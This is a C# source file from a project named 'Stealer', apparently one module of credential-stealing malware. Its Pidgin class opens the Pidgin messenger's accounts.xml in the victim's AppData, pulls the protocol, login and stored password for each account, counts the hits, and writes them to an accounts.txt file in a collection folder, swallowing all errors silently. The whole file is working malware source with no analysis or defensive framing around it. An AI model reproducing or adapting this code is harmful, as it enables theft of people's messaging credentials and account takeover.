using System.IO;
using System.Xml;
using System.Text;

namespace Stealer
{
    internal sealed class Pidgin
    {
        private static StringBuilder SBTwo = new StringBuilder();
        private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple\\accounts.xml");

        public static void GetAccounts(string sSavePath)
        {
            if (!File.Exists(PidginPath))
                return;

            try
            {
                XmlDocument xml = new XmlDocument();
                xml.Load(new XmlTextReader(PidginPath));

                foreach (XmlNode nl in xml.DocumentElement.ChildNodes)
                {
                    var Protocol = nl.ChildNodes[0].InnerText;
                    var Login = nl.ChildNodes[1].InnerText;
                    var Password = nl.ChildNodes[2].InnerText;

                    if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                    {
                        SBTwo.AppendLine($"Protocol: {Protocol}");
                        SBTwo.AppendLine($"Login: {Login}");
                        SBTwo.AppendLine($"Password: {Password}\r\n");

                        Counter.Pidgin++;
                    }
                    else
                        break;
                            
                }
                if (SBTwo.Length > 0)
                {
                        Directory.CreateDirectory(sSavePath);
                        File.AppendAllText(sSavePath + "\\accounts.txt", SBTwo.ToString());
                }
            }
            catch { }
                
        }
    }
}
